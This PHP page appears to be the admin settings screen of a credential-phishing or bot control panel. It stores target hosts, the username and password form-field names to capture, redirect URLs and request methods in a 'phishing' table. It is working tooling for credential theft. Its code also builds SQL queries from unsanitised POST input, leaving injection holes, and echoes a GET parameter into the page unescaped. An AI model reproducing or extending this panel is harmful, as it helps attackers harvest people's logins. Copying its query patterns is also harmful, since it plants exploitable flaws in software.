<?php
session_start();
require_once('inc/session.php');
require_once('inc/config.php');
require_once('inc/header.php');
require_once('connect/mysql.php');
require_once('classes/pagenavigation.class.php');
?>
<script type="text/javascript">
function AlleBoxen()
 {
   for(var x=0;x<document.boxen.elements.length;x++)
     { var y=document.boxen.elements[x];
       if(y.name!='alle') y.checked=document.boxen.alle.checked;
     }
 }
</script>


<h2>Phishing Settings
<div align="right" style="float:right;">
<?php
if(isset($_GET['p'])){
echo '<a href="phishing.php?p=' . $_GET['p'] . '">';
}else{
echo '<a href="phishing.php">';
}
?>
<img src="img/other/refresh.png"></a></div>
</h2>


<table id="table">
  <tr>
    <th class="table" id="kleiner" style="color: black;width: 16px;"></th>
	<th class="table" style="color: black;width:5px;">Host Name</th>
	<th class="table" style="color: black;">Username Value</th>
	<th class="table" style="color: black;">Password Value</th>
	<th class="table" style="color: black;">Redirect URL</th>
	<th class="table" id="kleiner"  style="color: black;width:70px;">Require Methode</th>
	<th class="table" id="kleiner" style="color: black;width:5px;">L&ouml;schen</th>
  </tr>
  <form action="phishing.php" method="post" name="boxen" >
    <?php
		$query = mysql_query("SELECT COUNT(*) FROM phishing");
		$item_count = mysql_result($query, 0);
		$nav = new PageNavigation($item_count, $pagecount);
		$query = mysql_query("SELECT * FROM phishing ORDER BY 'Index' DESC LIMIT " . $nav->sql_limit);
		$item_number = $nav->first_item_id;
		
		
		  while($row = mysql_fetch_array($query))
		  {
			$IconRequest = mysql_query("SELECT * FROM remotehosts WHERE HostName = '" . $row['HostName'] . "'");
			$IconOfHost = mysql_fetch_row($IconRequest);
			echo '<tr>';
			echo '<td class="td" id="kleiner" style="color: black;width: 16px;"><img style="width: 16px;" src="img/pictures/' . $IconOfHost[2] . '"></td>';
			echo '<td class="td" style="color: black;">'.$row['HostName'].'</td>
						<td class="td" style="color: black;">'.$row['UsernameGetValue'].'</td>
						<td class="td" style="color: black;">'.$row['PasswordGetValue'].'</td>
						<td class="td" style="color: black;">'.$row['RedirectURL'].'</td>
						<td class="td" style="color: black;width:70px;">'.$row['RequireMethode'].'</td>
						<td class="td" id="kleiner" style="color: black;"><input type="checkbox" name="dele[]" value="'.$row['Index'].'" /></td>';
					    //<th class="table" style="text-align: center;"><a href="logs.php?delid='.$row[id].'"><img src="img/other/del.png" style="border: none;" /></a></th>
	?>
					</tr>
	<?php			
		   
		  }
		  echo '<td class="td" style="border:none;" id="kleiner" style="border:none;width: 16px;" ></td>';
		  echo '<td class="td" style="border:none;width: 150px;" ><select style="width: 160px;" name="AddHostName" class="tb" size="1">';
		  $query1 = mysql_query("SELECT * FROM remotehosts ORDER BY 'HostID'");
		  while($rows2 = mysql_fetch_array($query1))
		  {
			echo "<option>" . $rows2['HostName'] . "</option>";
		  }
		  echo '</select></td><td class="td"  style="border:none;" ><input type="text" style="width:100px;" class="tb" name="AddUserValue"></td>';
		  echo '<td class="td" style="border:none;" ><input type="text" style="width:100px;" class="tb" name="AddPassValue"></td>';
		  echo '<td class="td" style="border:none;" ><input type="text" style="width:200px;" class="tb" name="AddRedirectURL"></td>';
		  echo '<td class="td" style="border:none;" ><select style="width:70px;" name="AddMethode" class="tb" size="1"><option>GET</option><option>POST</option></select></td>';
		  echo '<td class="td" style="border:none;" id="kleiner" ><input type="image" src="img/other/add.png" style="cursor: pointer;border: none;background-color:#ffffff;" value="Search" class="button" name="confirm"></td>';
		  echo '';
	?>
	
</table>
<br />


<input type="Checkbox" name="alle" onClick="AlleBoxen(this.form);" value="alle">Select all
&nbsp;<input type="submit" class="button" name="del" value="Delete selected Values" />&nbsp;<a href="phishing.php?delall1=ja"></a>
</form>



<?php
	if(isset($_POST['del'])){
		for ($i=0; $i<count($_POST["dele"]); $i++) {
			$wegdamit = $_POST['dele'][$i];
			mysql_query("DELETE FROM `phishing` WHERE `Index` = " . $wegdamit);
		}
		
		echo '<script>alert(unescape("'.$i.' Values successfully deleted!"));</script>
			  <meta http-equiv="refresh" content="0; URL=phishing.php">';
	}
	
	if(isset($_POST['AddUserValue'])){
			$IconLink = $_POST['AddHostName'];
			$IconLink2 = $_POST['AddUserValue'];
			$IconLink3 = $_POST['AddPassValue'];
			$IconLink4 = $_POST['AddRedirectURL'];
			$IconLink5 = $_POST['AddMethode'];
			if($IconLink2==""){
			}else{
			if($IconLink==""){
			}else{
			if($IconLink3==""){
			}else{
			if($IconLink4==""){
			}else{
			$dd1 = mysql_query("SELECT * FROM `phishing` WHERE `HostName` = '" . $IconLink . "'");
			if(mysql_num_rows($dd1)==0){
			mysql_query("INSERT INTO `phishing`(`Index`, `HostName`, `UsernameGetValue`, `PasswordGetValue`, `RedirectURL`, `RequireMethode`) VALUES (NULL, '" . $IconLink . "', '" . $IconLink2 . "', '" . $IconLink3 . "', '" . $IconLink4 . "', '" . $IconLink5 . "')");
			}
			}
			}
			}
			}
			echo '<meta http-equiv="refresh" content="0; URL=phishing.php">';
	}
	
	
	echo '<div style="float: right;">'.$nav->createPageBar().'</div><br />';
	require_once('inc/footer.php'); 
?>